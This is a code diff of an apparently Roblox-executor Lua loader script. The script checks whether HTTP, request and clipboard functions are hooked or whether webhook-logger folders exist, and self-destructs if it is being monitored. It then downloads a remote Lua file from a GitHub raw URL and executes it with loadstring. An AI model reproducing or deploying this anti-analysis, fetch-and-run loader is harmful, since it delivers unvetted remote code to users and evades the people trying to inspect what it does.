@@ -19,23 +19,21 @@ local function checkHooks()
     if not isfunctionhooked then
         return false
     end
-    
-    local safeChecks = {
-        {func = game and game.HttpGet},
-        {func = game and game.HttpPost},
-        {func = tostring},
-        {func = setclipboard},
-        {func = request},
-        {func = http_request},
+    local funcs = {
+        game and game.HttpGet,
+        game and game.HttpPost,
+        tostring,
+        setclipboard,
+        request,
+        http_request,
     }
-    for _, check in ipairs(safeChecks) do
-        if check.func and isfunctionhooked(check.func) then
+    for _, f in ipairs(funcs) do
+        if f and type(f) == "function" and isfunctionhooked(f) then
             return true
         end
     end
-    if isfolder then
-        local folders = {"HttpGetFolder", "WebhookFolder", "RequestFolder"}
-        for _, folder in ipairs(folders) do
+    if isfolder and type(isfolder) == "function" then
+        for _, folder in ipairs({"HttpGetFolder", "WebhookFolder", "RequestFolder"}) do
             if isfolder(folder) then
                 return true
             end
@@ -54,34 +52,34 @@ for _, name in pairs({"rconsoleprint", "rconsolewarn", "rconsoleinfo", "rconsole
 end
 
 
-pcall(function()
-    if isfunctionhooked then
-        if checkHooks() then
-            selfDestruct()
-        else
-            spawn(function()
-                local startTime = os.clock()
-                while os.clock() - startTime < 60 do
-                    task.wait(2)
-                    if checkHooks() then
-                        selfDestruct()
-                        break
-                    end
+if isfunctionhooked and type(isfunctionhooked) == "function" then
+    if checkHooks() then
+        selfDestruct()
+    else
+        local startTime = os.clock()
+        spawn(function()
+            while os.clock() - startTime < 60 do
+                task.wait(2)
+                if checkHooks() then
+                    selfDestruct()
+                    break
                 end
-            end)
-        end
+            end
+        end)
     end
-end)
+end
+
 
 pcall(function()
     local url = "https://raw.githubusercontent.com/czcasdfwdk/dyk-jzq-czc/main/dykjzqjzq2-czc.lua"
     local content = game:HttpGet(url, true)
-    if content and type(content) == "string" and #content > 100 then
+    if content and #content > 100 then
+        
         local fn = loadstring(content)
         if fn then
-            
             xpcall(fn, function(err)
                 
+                print("外部脚本执行出错，尝试修复...")
             end)
         end
     end
